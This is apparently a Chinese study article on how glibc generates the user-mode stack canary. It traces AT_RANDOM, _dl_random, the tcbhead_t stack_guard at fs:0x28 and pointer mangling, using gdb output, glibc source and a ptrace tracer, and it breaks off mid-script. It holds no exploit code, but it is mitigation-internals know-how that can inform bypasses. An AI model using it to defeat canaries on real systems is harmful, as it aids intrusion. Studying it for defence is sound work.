> 参考资料：
>
> [https://dere.press/2020/10/18/glibc-tls/](https://dere.press/2020/10/18/glibc-tls/)
>
> [看雪学院：利用auxv控制canary（微笑明天）](https://mp.weixin.qq.com/s?srcid=0811GZU8d13pHFHk5RZXi2Ir&scene=23&sharer_sharetime=1628614977528&mid=2458302417&sharer_shareid=817300ea833ed8fde6b3dcafc70d83f3&sn=189c0270caee22c06e86937b2de6f19c&idx=3&__biz=MjM5NTc2MDYxMw%3D%3D&chksm=b181875b86f60e4dc1bf0a895605e2b676ab7022c82e393e612389396b652f263585971d356a&mpshare=1#rd)
>
> [https://qianfei11.github.io/2019/02/15/%E7%BB%95%E8%BF%87ELF%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6Canary/#Auxiliary-Vector](https://qianfei11.github.io/2019/02/15/%E7%BB%95%E8%BF%87ELF%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6Canary/#Auxiliary-Vector)
>
> [https://jontsang.github.io/post/34550.html](https://jontsang.github.io/post/34550.html)
>
> 
>

---

> 附件：
>
> 链接: [https://pan.baidu.com/s/1XQTItXSVhdFm3N14lXxk5g](https://pan.baidu.com/s/1XQTItXSVhdFm3N14lXxk5g) 
>
> 提取码: 3fwt --来自百度网盘超级会员v4的分享
>

# 简介
Canary是一种古老的漏洞缓解机制，当发生栈溢出时会覆盖到栈上的Canary从而改变Canary的值，此函数执行完毕后会异或检查Canary是否发生改变，若发生改变则调用__stack_chk_fail@plt退出程序。在本文中仅仅讨论用户态中的Canary。

# Canary名称的由来
Canary可以直译为金丝雀，在一氧化碳探测器没有问世时，为了挖煤的安全矿工都会随身带着金丝雀或将金丝雀放进矿洞中，当一氧化碳浓度升高是金丝雀会先报警；在二进制安全中，stack Canary表示栈的“报警保护”。

# 引入
这里编译一段代码来查看Canary：

```c
#include<stdio.h>
int main(){
    printf("Cyberangel\n");
    printf("Canary User Mode\n");
    return 0;
}
```

> 编译命令：gcc -g -z execstack -no-pie -z norelro -fstack-protector-all test.c -o test
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628830591286-724fb29f-a911-4b2f-8d12-9596229a612a.png)

编译完成之后进入gdb查看程序的汇编代码：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628830629696-44454e75-b954-4588-ad17-047b582bd828.png)

main函数中与Canary相关的有如下几条汇编指令：

```c
0x000000000040052f <+8>:     mov    rax,QWORD PTR fs:0x28
0x0000000000400538 <+17>:    mov    QWORD PTR [rbp-0x8],rax
......
0x000000000040055b <+52>:    mov    rdx,QWORD PTR [rbp-0x8]
0x000000000040055f <+56>:    xor    rdx,QWORD PTR fs:0x28
0x0000000000400568 <+65>:    je     0x40056f <main+72>
0x000000000040056a <+67>:    call   0x400430 <__stack_chk_fail@plt>
```

简单说一下，执行到0x40052f的指令后，程序会将fs:0x28中存放的Canary随机数值通过两个mov指令放入到rbp-0x8处，最后在程序即将返回时将栈上的rbp-0x8与fs:0x28中存放的数值进行异或，如结果不为0则进入__stack_chk_fail@plt结束程序。可以在gdb中使用canary命令查看程序当中生成的Canary数值：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628831138500-89613164-1fe5-422f-9bed-4b8368f172fa.png)

所以开启canary之后程序的栈结构如下：

```c
        Low Address
                |                 |
                +-----------------+
                |     buffer      |
                +-----------------+
                |     Canary      |
                +-----------------+
                |    rbp(ebp)     |
                +-----------------+
       			|   return addr   |
                +-----------------+
       			|                 |
                |     ......      |
     		    |                 |
                +-----------------+
                |                 |
       High Address
```

# 编译时常见的Canary等级
+ -fstack-protector：启用保护，不过只为局部变量中含有数组的函数插入保护
+ -fstack-protector-all：启用保护，为所有函数插入保护
+ -fno-stack-protector：禁用保护

# Canary的常见类型
Canary的类型主要有三种，Terminator canaries、Random canaries、Random XOR canaries。

+ Terminator canaries：在实战的情况下，许多栈溢出是由于对字符串操作不当而产生的，常见的函数如strcpy，从而导致攻击者利用栈溢出劫持程序的流程。当然Canary的本质也是一种字符串，为了应对这一点，这种Canary将低位设置成"\x00"，即可以防止使用“puts、printf”的泄露（截断）又可以防止Canary的伪造。截断字符还可以包括CR(0x0d)、LF(0x0a)和EOF(0xff)。这种的Canary的值是固定的。
+ Random canaries：由于Terminator canaries是固定的，所以产生了Random canaries；这种Canary通常由/dev/urandom产生的，这个值通常在程序初始化的时候进行生成，并会保存一个相对安全的地方（这个地方也是可写的）。如果不支持/dev/urandom，则通过本机时间的哈希值来产生Canary。
+ Random XOR canaries：在Random canarie的基础上，使用xor异或操作将低8bit清零，并且增加了对Canary的校验，这样无论是canaries被篡改还是在校验时与XOR的数据数据被篡改，都会发生错误，这就增加了攻击难度。

glibc中的Canary机制将后两者相结合，既是随机数又增加了校验过程，大大增加了攻击的成本。并且在编译好的程序中并不定义Canary的值，因此Canary只有在程序初始化后才知道，不能通过查看静态的binary得到。

# Canary的生成机制
> 研究的过程中会多次调试程序导致Canary不同，请忽略这里一点；文章后面的内容都是以64位程序为例，32位程序原理相同。
>

在开头我们要声明一点，动态链接和静态链接的程序生成Canary的步骤略有区别，所以接下来我们要分开研究。

## 动态链接中Canary的生成
### 调试准备
> glibc 源码获取教程：[https://www.yuque.com/cyberangel/rg9gdm/hagsy9#rBtjJ](https://www.yuque.com/cyberangel/rg9gdm/hagsy9#rBtjJ)
>

在动态链接的ELF中，因为程序由内核加载完成之后会将控制权限转移到ld-2.27.so(ld-linux-x86-64.so.2)，所以我们注定绕不过这个“解释器”文件；调试它需要下载对应的glibc debug文件，首先确定本机上的glibc版本：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628912037698-d2efe5a6-1452-4318-a646-f7a40c1ffd41.png)

到这里去下载对应的符号文件：[https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/](https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628912106054-c2c0caef-ac81-4862-ad69-c077d8789dc2.png)

下载完成后使用如下命令进行解压：

> dpkg -X  libc6-dbg_2.27-3ubuntu1.4_amd64.deb ./symbols #symbols是你要解压的目录
>

**这样我们就可以在调试的时候对ld-2.27.so中的函数下断点了。**接下来开始调试，记住关闭系统的ALSR。首先引入符号文件：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628912540096-32a6563e-9a7b-4acd-81dd-804ee8e763d6.png)

这里选择从内核加载完成之后开始调试，为了可以命中ld-2.27.so的断点，我们得先让程序跑起来：b main，r；然后对程序的最初入口点<font style="color:#000000;">_dl_start</font>下断点：b <font style="color:#000000;">_dl_start，输入r重新调试即可命中：</font>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628912821268-443146c9-53f3-4885-87b1-3d3674f60eb7.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628913013372-90d48277-8c8c-41b3-a1e5-6f1e3d7fd6b8.png)

<font style="color:#000000;">如上图所示，现在程序中只链接了ld-2.27.so这一个库，这是因为</font>ELF程序的初始化工作是由Glibc来完成，而动态共享库的加载和初始化工作由"动态加载器(ld-linux-so.2)"完成，可以看一下这时程序的栈帧：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628913242543-4c71dd74-5e7b-41a7-9f45-8f02c1fcadd2.png)

ld-linux-so.2的入口函数为_start函数，它是一段很简单的汇编代码，这里就不多说了：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628913544378-692b4b84-dc72-42de-859f-8e302d7554b1.png)

进入_dl_start函数后引入rtld.c源码进行调试：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628913870784-294e5905-36cc-4a4c-8fd2-1606f7719b8f.png)

### Canary的初始化
这里我们并不关注其他的函数，直接在此源码中搜索“canary”字样可以发现其存在于security_init函数中。

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628914662812-28f3131d-59c0-4819-8cc3-888b7c657cec.png)

同时对security_init下断点(b security_init)，在gdb中来到此处:

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628914796604-8ab4f82a-0dd7-46b8-af49-924aeb6c5d03.png)

先关注security_init调用的函数_dl_setup_stack_chk_guard的_dl_random，我们回溯栈帧查找一下，最终发现此值在_dl_sysdep_start函数中进行赋值（glibc-2.27/elf/dl-sysdep.c）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628917025668-aedc9153-05f9-4bc1-ad47-f24730cb2b56.png)

_dl_random是一个全局**<font style="color:#F5222D;">指针</font>**变量，这个变量声明在glibc-2.27/elf/dl-support.c

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628833896717-d63a8584-94ee-4a92-bef1-744f031b6db0.png)

注释当中写到：_dl_random的值是由Linux内核提供的；但是对_dl_random赋值时指针av指向哪里？同样的下断点查看一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628917206662-686ff772-db45-41a6-83a8-c6bddddc050e.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628917264293-7c28843c-755f-462f-9cbc-34a83eee5494.png)

很眼熟，这个就是之前介绍的Elf64_auxv_t结构体：

> 参见：
>

[初识ELF Auxiliary Vector（辅助向量）](https://www.yuque.com/cyberangel/rg9gdm/ym460z)

```c
typedef struct
{
  uint64_t a_type;		/* Entry type */
  union
    {
      uint64_t a_val;		/* Integer value */
      /* We use to have pointer elements added here.  We cannot do that,
	 though, since it does not work when using 32-bit definitions
	 on 64-bit platforms and vice versa.  */
    } a_un;
} Elf64_auxv_t;
```

这里还是简单的了解一下Linux内核对AUXV的初始化过程：

1. sys_execve()
2. 调用do_execve_common()
3. 调用search_binary_handler()
4. 调用load_elf_binary()
5. 调用create_elf_tables()

最重要的就是其中的create_elf_table函数，其代码会初始化辅助向量（push 到 User stack）：

```c
#定义在/usr/src/linux/fs/binfmt_elf.c(需额外下载Linux内核源码)
NEW_AUX_ENT(AT_PAGESZ, ELF_EXEC_PAGESIZE);
NEW_AUX_ENT(AT_PHDR, load_addr + exec->e_phoff);
NEW_AUX_ENT(AT_PHENT, sizeof (struct elf_phdr));
NEW_AUX_ENT(AT_PHNUM, exec->e_phnum);
NEW_AUX_ENT(AT_BASE, interp_load_addr);
NEW_AUX_ENT(AT_ENTRY, exec->e_entry);
......
```

入栈之后就会将程序的控制权交给ld.so，所以这里av指针遍历每个Elf64_auxv_t结构体依据a_type使用switch case对各个全局变量进行赋值：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628917698891-98ea4e57-b459-474f-90a2-5dc70a526419.png)

回过头来再看_dl_setup_stack_chk_guard函数，它定义在：glibc-2.27/sysdeps/generic/dl-osinfo.h中：

```c
static inline uintptr_t __attribute__ ((always_inline))
_dl_setup_stack_chk_guard (void *dl_random)
{
  union
  {
    uintptr_t num;
    unsigned char bytes[sizeof (uintptr_t)];
  } ret = { 0 };

  if (dl_random == NULL)
    {
      ret.bytes[sizeof (ret) - 1] = 255;
      ret.bytes[sizeof (ret) - 2] = '\n';
    }
  else
    {
      memcpy (ret.bytes, dl_random, sizeof (ret));
#if BYTE_ORDER == LITTLE_ENDIAN
      ret.num &= ~(uintptr_t) 0xff;
#elif BYTE_ORDER == BIG_ENDIAN
      ret.num &= ~((uintptr_t) 0xff << (8 * (sizeof (ret) - 1)));
#else
# error "BYTE_ORDER unknown"
#endif
    }
  return ret.num;
}

```

在此函数中，首先判断传入的参数dl_random是否为NULL，如果为NULL则将dl_random设置为0xff0a000000000000（64位）或0xff0a0000（32位）：

```c
typedef unsigned long int	uintptr_t; //定义在：glibc-2.27/sysdeps/generic/stdint.h
#include<stdio.h>
int main(){
    union{
        uintptr_t num;
        unsigned char bytes[sizeof (uintptr_t)];
    } ret = { 0 };

    ret.bytes[sizeof (ret) - 1] = 255;
    ret.bytes[sizeof (ret) - 2] = '\n';
    printf("0x%lx\n",ret.num);
}
```

若传入的dl_random不为NULL，则调用memcpy将dl_random拷贝到ret.bytes中，根据机器的大小端序对ret.num进行处理，但是最终效果都是将Canary的低8位（1字节）为\x00。对应的汇编代码只有如下两行：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628919857683-9292f72f-5168-40ef-a7f5-0ccfbde5aafa.png)

这个函数的返回值为stack_chk_guard。我们继续按照程序的流程走：THREAD_SET_STACK_GUARD (stack_chk_guard)是一个宏函数，它定义在glibc-2.27/sysdeps/x86_64/nptl/tls.h中：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628920885776-2aae9fa8-e6e0-4f4a-a375-5241fab01113.png)

它的本质是THREAD_SETMEM，同样定义在此文件中；这个函数的第二个参数header.stack_guard（即传入的value）与Canary有关，header的定义如下：

```c
//glibc-2.27/fbtl/descr.h
/* Thread descriptor data structure.  */
struct pthread
{
  union
  {
#if !TLS_DTV_AT_TP  //TLS_DTV_AT_TP==0
    /* This overlaps the TCB as used for TLS without threads (see tls.h).  */
    tcbhead_t header;
#else
  ......
} __attribute ((aligned (TCB_ALIGNMENT)));
```

所以header实际上是tcbhead_t结构体，其中的stack_guard和Canary相关：

```c
//glibc-2.27/sysdeps/x86_64/nptl/tls.h
typedef struct
{
  void *tcb;		/* Pointer to the TCB.  Not necessarily the
			   thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;		/* Pointer to the thread descriptor.  */
  int multiple_threads;
  int gscope_flag;
  uintptr_t sysinfo;
  uintptr_t stack_guard;  #注意这里和Canary相关
  uintptr_t pointer_guard;
  unsigned long int vgetcpu_cache[2];
# ifndef __ASSUME_PRIVATE_FUTEX
  int private_futex;
# else
  int __glibc_reserved1;
# endif
  int __glibc_unused1;
  /* Reservation of some values for the TM ABI.  */
  void *__private_tm[4];
  /* GCC split stack support.  */
  void *__private_ss;
  long int __glibc_reserved2;
  /* Must be kept even if it is no longer used by glibc since programs,
     like AddressSanitizer, depend on the size of tcbhead_t.  */
  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));

  void *__padding[8];
} tcbhead_t;
```

稍加计算就会发现，成员stack_guard在此结构体中的偏移正好是8*3+4*2+8=0x28，对应了fs:0x28，所以实际上fs寄存器指向的就是tcbhead_t。回到security_init，继续向下看_dl_setup_pointer_guard函数：

```c
//glibc-2.27/sysdeps/generic/dl-osinfo.h
static inline uintptr_t __attribute__ ((always_inline))
_dl_setup_pointer_guard (void *dl_random, uintptr_t stack_chk_guard)
{
  uintptr_t ret;
  if (dl_random == NULL)
    ret = stack_chk_guard;
  else
    memcpy (&ret, (char *) dl_random + sizeof (ret), sizeof (ret));
  return ret;
}
```

这个函数传入的是_dl_random和已经格式化之后生成的Canary，然后调用THREAD_SET_POINTER_GUARD将内容传入到fs寄存器所指向的地方：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629094353105-dbebbec3-2336-490a-9c7b-41e5ef263fcd.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629094410925-226f97da-89b0-4a3f-ae6a-d733b058c443.png)

这样Canary的初始化就基本上完成了。

### fs寄存器的初始化
> 为了方便描述，我们将tcbhead_t结构体简称为TLS结构体
>

fs寄存器是段寄存器中的其中一个，在Linux有特殊的含义--指向本线程的TLS。

> 结构可以参见：[https://www.yuque.com/cyberangel/rg9gdm/oyne1i#TVH8m](https://www.yuque.com/cyberangel/rg9gdm/oyne1i#TVH8m)
>

TLS的全称为Thread Local Storage即线性局部存储，它的目的是为了让每个线程与对应的数据关联起来，每个线程都拥有自己的TLS，同时线程之间的TLS互不干扰，但是Canary在所有的线程中都是相同的。接下来我们要研究一下fs寄存器的初始化过程，选择使用strace来跟踪一下：

> strace安装命令：apt install strace
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629094766176-0ee1c30e-1944-46e7-b850-2d54e61ae280.png)

在上图的红箭头处发现了fs的字样，arch_prctl的函数原型如下：

> [https://man7.org/linux/man-pages/man2/arch_prctl.2.html](https://man7.org/linux/man-pages/man2/arch_prctl.2.html)
>

```c
#include <asm/prctl.h>        /* Definition of ARCH_* constants */
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <unistd.h>

int syscall(SYS_arch_prctl, int code, unsigned long addr);
int syscall(SYS_arch_prctl, int code, unsigned long *addr);
```

各个参数的作用为：

+ SYS_arch_prctl：系统调用号
+ code，addr：代表着对fs寄存器和gs寄存器的几种操作：

       ARCH_SET_FS：将FS寄存器的64位基址设置为addr。

       ARCH_GET_FS：返回addr指向的无符号长整数中当前线程FS寄存器的64位基址

       ARCH_SET_GS：将GS寄存器的64位基址设置为addr。

       ARCH_GET_GS：返回addr指向的无符号长整数中当前线程FS寄存器的64位基址

可以看出，arch_prctl的本质是syscall系统调用，它可以设置fs和gs寄存器中的值。我们在gdb中回溯一下栈帧：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629098453905-f4db4970-083c-4e1f-bfa0-97a39bc3eecb.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629098516115-bbe55a8f-11b3-42c7-867e-f3222d75ff68.png)

TLS_INIT_TP定义在：glibc-2.27/sysdeps/x86_64/nptl/tls.h

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629098861847-393c1718-6f96-48ae-a6e1-f13a3aa50e9f.png)

这张图对应一下就是：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629118180926-8ae3b4b3-f746-4842-9522-0c7439b3e56d.png)

在上方图片的红箭头处调用syscall在内核中设置了fs的base（基址）：0x7ffff7fee4c0；通过上面宏TLS_INIT_TP我们可以看到该基址指向的数据类型为之前提到过的tcbhead_t，并且在此宏中对tcbhead_t结构体的成员tcb和self成员进行了写入。最终在内存中的效果如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629103610393-13a7eba2-6eb9-4d25-a809-a7a2f71c25bf.png)

另外要注意，0x7ffff7fee4c0这个地址存在于vvar和ld-2.27.so之间：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629215348693-bed7cb6b-71c7-4554-8359-8cb2bc1b672f.png)

**这个段的权限是rwx，也就是说这个段是可写、可读、可执行的，但是这个段权限并不针对所有的程序都是这样，至少它是可写可读的。**

Q：为什么fs:0x28可以访问到Canary（0x7ffff7fee4e8），按理说根据fs的base【（基址）0x7ffff7fee4c0】计算出来的结果不是这样的，不是应该是ds.base*0x10+0x28==0x7ffff7fee4c0*0x10+0x28==非法地址😂吗？

A：确实，如果看了这片文章[https://www.yuque.com/cyberangel/rg9gdm/oyne1i#TVH8m](https://www.yuque.com/cyberangel/rg9gdm/oyne1i#TVH8m)的话肯定有疑问，fs寄存器的访问方式与内核有关，这里不研究。

### 总结
这里再梳理一下Canary在动态链接的过程中初始化的流程：

1. Linux内核将ELF可执行文件加载到内存中对AUXV辅助向量进行初始化存放在用户的栈中。
2. Linux内核将程序的控制权限交给ld.so以便于初始化程序的动态链接库，有关Canary的调用链如下：_start->_dl_start->_dl_start_final->_dl_sysdep_start；在_dl_sysdep_start函数中会将栈上的辅助向量（随机数）在宏定义AT_RANDOM的辅助下将数据复制给全局指针变量_dl_random。
3. 全局变量初始化结束后会调用_dl_sysdep_start结尾处的dl_main函数，进入此函数后会开始初始化TLS结构体，其中最重要的是init_tls函数中的TLS_INIT_TP宏函数，它会对fs寄存器进行设置，让其指向TLS结构体（tcbhead_t结构体）【_dl_sysdep_start->dl_main->init_tls->TLS_INIT_TP】
4. 然后进入dl_main中的security_init对_dl_random进行进一步处理：在security_init函数中首先调用_dl_setup_stack_chk_guard (_dl_random)，在这个函数中若传入的_dl_random为NULL则将union共用体中的ret.bytes设置为0xff0a000000000000（64位）或0xff0a0000（32位）；若_dl_random不为NULL，则调用memcpy将dl_random拷贝到ret.bytes中，根据机器的大小端序对ret.num进行处理但是最终效果都是将Canary的低8位（1字节）清零。函数将返回ret.num即stack_chk_guard。【_dl_sysdep_start->dl_main->security_init->_dl_setup_stack_chk_guard】
5. 调用THREAD_SET_STACK_GUARD (stack_chk_guard)也就是THREAD_SETMEM(descr, member, value)使用fs寄存器寻址对fs:0x28（64位）（即TLS结构体（tcbhead_t结构体）中的stack_guard）进行赋值【_dl_sysdep_start->dl_main->security_init->_dl_setup_stack_chk_guard】
6. 调用_dl_setup_pointer_guard (_dl_random, stack_chk_guard)对ret进行设置，若dl_random为NULL则stack_chk_guard赋值给ret，否则调用memcpy将ret设置为_dl_random+0x8地址中存放的数据额外进行设置，函数返回值为pointer_chk_guard（即ret）【_dl_sysdep_start->dl_main->security_init->_dl_setup_pointer_guard】【_dl_random+0x8地址处存放的数据不属于AUXV，该值由内核初始化，这个值的作用将在稍后进行说明】
7. 调用THREAD_SET_POINTER_GUARD (pointer_chk_guard)将pointer_chk_guard存放到fs:0x30处，也就是对tcbhead_t结构体成员中的pointer_guard进行赋值【_dl_sysdep_start->dl_main->security_init->THREAD_SET_POINTER_GUARD】
8. 之后设置__pointer_chk_guard_local = pointer_chk_guard;【可以使用p &__pointer_chk_guard_local查看】
9. 最后将指针_dl_random设置为NULL，因为这个指针已经没有用，表示Canary已经设置完成。<font style="background-color:#FADB14;"></font>

```c
pwndbg> x/16gx 0x7ffff7ffce50
0x7ffff7ffce50 <_dl_random>:    0x00007fffffffe4f9      0x00007fffffffe2b0
    						    #该值将被设置为NULL
0x7ffff7ffce60 <__libc_enable_secure>:  0x0000000000000000      0x000000000000000e
0x7ffff7ffce70: 0x00000000000001e1      0x0000000000000004
0x7ffff7ffce80: 0x00007ffff7dd31f0      0x000000006ffffef5
0x7ffff7ffce90: 0x00007ffff7dd32c8      0x0000000000000005
0x7ffff7ffcea0: 0x00007ffff7dd36f0      0x0000000000000006
0x7ffff7ffceb0: 0x00007ffff7dd33c0      0x000000000000000a
0x7ffff7ffcec0: 0x0000000000000224      0x000000000000000b
pwndbg> x/16gx 0x00007fffffffe4f9
0x7fffffffe4f9: 0xa2c0efad197eff39      0xd2eee02b7f7aebeb
    		    #Canary
0x7fffffffe509: 0x000034365f363878      0x0000000000000000
0x7fffffffe519: 0x2f746f6f722f0000      0x555f7972616e6143
0x7fffffffe529: 0x65646f4d5f726573      0x534c00747365742f
0x7fffffffe539: 0x3d53524f4c4f435f      0x3d69643a303d7372
0x7fffffffe549: 0x6e6c3a34333b3130      0x6d3a36333b31303d
0x7fffffffe559: 0x3d69703a30303d68      0x6f733a33333b3034
0x7fffffffe569: 0x643a35333b31303d      0x3a35333b31303d6f
pwndbg> canary 
AT_RANDOM = 0x7fffffffe4f9 # points to (not masked) global canary value
Canary    = 0xa2c0efad197eff00 (may be incorrect on != glibc)
No valid canaries found on the stacks.
pwndbg> 
```

### 补充
---

关于security_init中一些变量和宏定义的问题

这里首先来看这一部分代码：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629179387452-26b1631d-5381-4a7b-8153-b63a4335cf32.png)

这里的宏定义可以看成if...else语句，如果宏定义THREAD_SET_STACK_GUARD已经定义则执行THREAD_SET_STACK_GUARD (stack_chk_guard)设置TLS结构体；如果未定义则将stack_chk_guard赋值给__stack_chk_guard，但是这里的__stack_chk_guard是什么东西，为什么要这样做？

要解答问题就先从__stack_chk_guard定义看起（定义仍然在rtld.c中）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629179735032-b834b76b-0853-4a19-adb1-1c1638dc92b8.png)

> <font style="color:#6a9955;">/* Only exported for architectures that don't store the stack guard canary in thread local area.  */</font>
>

注释写的已经很明白了：在某些不将Canary保存在TLS（线性局部存储）的机器架构中，会将stack_chk_guard的值保存到全局变量__stack_chk_guard中；另外，由glibc保存后这个区域是只读的。在ubuntu中，glibc不会将stack_chk_guard保存到__stack_chk_guard，但是__pointer_chk_guard_local是一个例外，继续向下看THREAD_SET_POINTER_GUARD：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629181529068-a574ea71-20d5-43de-9db9-510ae6bdb079.png)

主要看途中812行的代码，根据if语句的逻辑，所有使用glibc的系统都会将pointer_chk_guard保存到全局变量__pointer_chk_guard_local中。函数secutity_init函数执行完毕之后会在某处（不想找了）对__pointer_chk_guard_local所在的段权限设置为只读，可以使用strace跟踪一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629184987509-163a924b-75cd-48be-b1c4-42c20d3f2657.png)

效果如下所示，__pointer_chk_guard_local所在的其中一个ld-2.27.so段权限不可写：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629185237611-cea26953-8476-4a82-9fe7-901ebdd09539.png)

然后解答之前的问题：__pointer_chk_guard_local有什么用？

__pointer_chk_guard_local是由Linux内核生成的，生成之后会push到User stack中，虽然与Canary没有任何关系，但是由于它的数值是随机的，所以可以用于glibc内部的指针加密，通常使用如下的宏定义进行加密和解密（glibc-2.27/sysdeps/unix/sysv/linux/x86_64/sysdep.h）：

```c
/* Pointer mangling support.  */
#if IS_IN (rtld)
/* We cannot use the thread descriptor because in ld.so we use setjmp
   earlier than the descriptor is initialized.  */
# ifdef __ASSEMBLER__
#  define PTR_MANGLE(reg)	xor __pointer_chk_guard_local(%rip), reg;    
				rol $2*LP_SIZE+1, reg   
                //LP_SIZE宏定义在glibc-2.27/sysdeps/x86_64/sysdep.h或glibc-2.27/sysdeps/x86_64/x32/sysdep.h
                //在64位下为8，在32位下为4
#  define PTR_DEMANGLE(reg)	ror $2*LP_SIZE+1, reg;			     
				xor __pointer_chk_guard_local(%rip), reg
# else
#  define PTR_MANGLE(reg)	asm ("xor __pointer_chk_guard_local(%%rip), %0\n" 
				     "rol $2*" LP_SIZE "+1, %0"			  
				     : "=r" (reg) : "0" (reg))
#  define PTR_DEMANGLE(reg)	asm ("ror $2*" LP_SIZE "+1, %0\n"		  
				     "xor __pointer_chk_guard_local(%%rip), %0"   
				     : "=r" (reg) : "0" (reg))
# endif
#else
# ifdef __ASSEMBLER__
#  define PTR_MANGLE(reg)	xor %fs:POINTER_GUARD, reg;		      
				rol $2*LP_SIZE+1, reg
#  define PTR_DEMANGLE(reg)	ror $2*LP_SIZE+1, reg;			      
				xor %fs:POINTER_GUARD, reg
# else
#  define PTR_MANGLE(var)	asm ("xor %%fs:%c2, %0\n"		      
				     "rol $2*" LP_SIZE "+1, %0"		      
				     : "=r" (var)			      
				     : "0" (var),			      
				       "i" (offsetof (tcbhead_t,	      
						      pointer_guard)))
#  define PTR_DEMANGLE(var)	asm ("ror $2*" LP_SIZE "+1, %0\n"	      
				     "xor %%fs:%c2, %0"			      
				     : "=r" (var)			      
				     : "0" (var),			      
				       "i" (offsetof (tcbhead_t,	      
						      pointer_guard)))
# endif
#endif
```

在这两个宏定义中，PTR_MANGLE用来进行加密，PTR_DEMANGLE用来解密；可以从上面的宏定义分别总结下：

+ PTR_MANGLE：rol(ptr ^ __pointer_chk_guard_local, 0x11, 64)
+ PTR_DEMANGLE：ror(encode, 0x11, 64) ^ __pointer_chk_guard_local【encode是使用PTR_MANGLE后加密的内容】

---

```c
pwndbg> 
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /root/Canary_User_Mode/test
          0x600000           0x601000 rwxp     1000 0      /root/Canary_User_Mode/test
    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dc9000     0x7ffff7dcd000 r-xp     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcd000     0x7ffff7dcf000 rwxp     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcf000     0x7ffff7dd3000 rwxp     4000 0      anon_7ffff7dcf   
    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7fed000     0x7ffff7fef000 rwxp     2000 0      anon_7ffff7fed  #TLS结构体所在的地方
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r-xp     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rwxp     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rwxp     1000 0      anon_7ffff7ffe
    0x7ffffffde000     0x7ffffffff000 rwxp    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> 
```

## 静态链接中Canary的生成机制
静态链接Canary的生成过程和动态链接的不太一样，这里只说不一样的地方:

1. 静态链接似乎无法引入源码进行调试
2. 静态链接可以使用如下代码对程序的初始化过程进行追踪

```c
#include <stdio.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/ptrace.h>

int main(int argc, char **argv)
{
  int pid = fork();
  if(pid == 0) {
    if(ptrace(PTRACE_TRACEME) < 0) {
      perror("ptrace");
      _exit(1);
    }
    execvp(argv[1], argv + 1);
    perror("exec");
    _exit(1);
  }
  while(1) {
    int status;
    struct user_regs_struct regs;
    if(waitpid(pid, &status, 0) < 0)
      perror("waitpid");
    if(!WIFSTOPPED(status))
      break;
    if(ptrace(PTRACE_GETREGS, pid, 0, &regs) < 0)
      perror("ptrace/GETREGS");
    printf("%llx %llx\n", regs.rip, regs.rsp);
    if(ptrace(PTRACE_SINGLESTEP, pid, 0, 0) < 0)
      perror("ptrace/SINGLESTEP");
  }
  return 0;
}
```

> 编译命令：gcc -g trace.c -o trace
>

对上述文件进行编译后还需要如下python代码进行辅助：

```python
import subprocess
import sys

def read():
    for line in sys.stdin:
        try:
            regs = [int(x, 16) for x in line.split(" ")]
